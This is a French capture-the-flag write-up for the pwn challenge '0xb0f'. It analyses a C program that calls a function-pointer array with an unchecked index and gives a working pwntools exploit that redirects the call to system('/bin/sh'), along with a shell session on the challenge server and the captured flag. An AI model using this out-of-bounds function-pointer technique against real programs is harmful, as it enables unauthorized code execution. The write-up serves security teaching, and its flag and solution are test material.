## PWN / 0xb0f

<p align="center">
  <img src="img/consignes.png" />
</p>

### Fichiers

- [Code source](0x00b.c)
- [Binaire](0x00b)
- [Linker](ld-musl-x86_64.so.1)

Le code source nous est donnée, ce qui est plus simple pour l'analyse statique, ainsi que le linker cette fois. Effectivement, le binaire ne se lance pas en local (pas la bonne libc), mais on peut le patcher avec ![pwninit](https://github.com/io12/pwninit)

```bash
$ pwninit --bin 0x00b --ld ld-musl-x86_64.so.1
```

Et on récupère un `0x00b_patched` qui fonctionne.


```bash
$ checksec --file=0x00b_patched
RELRO           STACK CANARY      NX            PIE
Partial RELRO   Canary found      NX enabled    No PIE
```



### Code source

```c
void (*functions[2])(char *);
char user_input[100];

void get_input(char *buffer){ fgets(buffer, 100, stdin); }

void execute(char *buffer){ system(buffer); }

int main()
{
    puts("Fill the buffer:");
    fgets(user_input, 100, stdin);
    functions[0] = &puts;
    functions[1] = &get_input;

    char *input = NULL;
    size_t input_len = 0;

    char input_buffer[100];

    while (1)
    {
        printf("0: puts\n"
               "1: get_input\n"
               " >> ");
        if (getline(&input, &input_len, stdin) == -1)
            break;

        int choice = atoi(input);
        functions[choice](input_buffer);
    }
}
```

Le programme nous permet :
- de remplir un buffer `user_input`
- d'appeler une fonction `puts` ou `get_input` sur un autre buffer `input_buffer`


La vulnérabilité vient de la façon dont est construit le tableau de pointeur de fonctions `functions` et surtout de l'appel à une des fonctions pointées sans contrôler le choix de l'utilisateur.
- si on appelle `0` c'est `puts`
- si on appelle `1` c'est `get_input`

En revanche si l'on appelle un indice plus grand ? Et bien le programme va aller chercher sur la stack l'adresse qui se trouve à `*functions[i]`


### Exploit


Comme on contrôle le buffer situé juste après `functions`, on peut écrire dedans l'adresse de `execute()` et appeler une `functions` avec un indice plus élevé que `1`.

Du coup on aura appelé `execute(input_buffer)`

En ayant pris soin auparavant d'écrire dans le buffer la commande de notre choix.

- code : [0x00b.py](0x00b.py)

```python
execute = 0x00000000004011ad

# write execute address into buffer user_input
payload = p64(execute) * 10
payload += b"A" * (100 - len(payload) -1 )
payload +=b'\n'

r = conn()

r.send(payload)

# write commande into buffer input_buffer
r.send(b'1\n')
r.send(b'/bin/sh\x00\n')

# call execute(input_buffer)
r.send(b'4\n')
r.interactive()
```




```bash
$ python3 0x00b.py
[+] Opening connection to pwn.pwnme.fr on port 7004: Done
[*] Switching to interactive mode
Fill the buffer:
$ id
uid=100(player) gid=101(ctf) groups=101(ctf)
$ ls
0x00b
entry.sh
flag.txt
$ cat flag.txt
PWNME{3a2d78fdc823736af2bd10a35a439b08}
```
